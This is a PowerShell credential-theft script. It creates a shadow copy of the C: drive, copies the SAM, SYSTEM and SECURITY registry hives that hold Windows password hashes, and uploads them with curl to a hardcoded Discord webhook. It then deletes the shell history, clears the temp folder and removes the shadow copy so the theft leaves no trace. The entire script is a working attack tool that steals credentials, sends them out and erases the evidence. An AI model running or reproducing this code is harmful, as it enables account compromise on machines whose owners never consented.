$webhookUrl = "https://discordapp.com/api/webhooks/1360981550174441498/cxv3RG3NDt_eRobBKo7STK3C-mmx76IS5T8QJ07qZnspV749ZRZ0uLVRGBzzsq_2Rh3v"


# Create a shadow copy of the C: drive
$vss = (Get-WmiObject -List win32_shadowcopy).Create("C:\", "ClientAccessible")

# for getting the ID of the shadow copy
$createdShadowCopy = Get-WmiObject Win32_ShadowCopy | Where-Object { $_.DeviceObject -eq $vss.DeviceObject }
$createdShadowCopyId = $createdShadowCopy.ID 

# Get the list of all shadow copies
$shadowCopies = Get-WmiObject Win32_ShadowCopy

# Build the device path to access the snapshot
$devicePath = $createdShadowCopy.DeviceObject + "\"

# setting output path
$outputPath = "$env:TEMP\shadow_dump"
New-Item -ItemType Directory -Path $outputPath -Force | Out-Null

# 5. Copy SAM, SYSTEM, and SECURITY from the shadow copy
Copy-Item "${devicePath}Windows\System32\config\SAM" "$outputPath\SAM"
Copy-Item "${devicePath}Windows\System32\config\SYSTEM" "$outputPath\SYSTEM"
Copy-Item "${devicePath}Windows\System32\config\SECURITY" "$outputPath\SECURITY"


$form = @{
    "file1" = Get-Item -LiteralPath $outputPath\SAM
    "file2" = Get-Item -LiteralPath $outputPath\SYSTEM
    "file3" = Get-Item -LiteralPath $outputPath\SECURITY
}

# Sending the files to Discord
curl.exe -F "file1=@$outputPath\SAM" -F "file2=@$outputPath\SYSTEM" -F "file3=@$outputPath\SECURITY" $webhookUrl

# Delete trace of the script
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue


Remove-Item -Path $outputPath -Force -ErrorAction SilentlyContinue

Clear-Content -Path "$env:TEMP\*" -Force
# Delete the specific shadow copy we created using its ID
$targetShadowCopy = $shadowCopies | Where-Object { $_.ID -eq $createdShadowCopyId }

if ($targetShadowCopy) {
    $targetShadowCopy.Delete()  # Delete the shadow copy
    Write-Host "Shadow copy with ID: $createdShadowCopyId deleted."
} else {
    Write-Host "No matching shadow copy found with ID: $createdShadowCopyId"
}
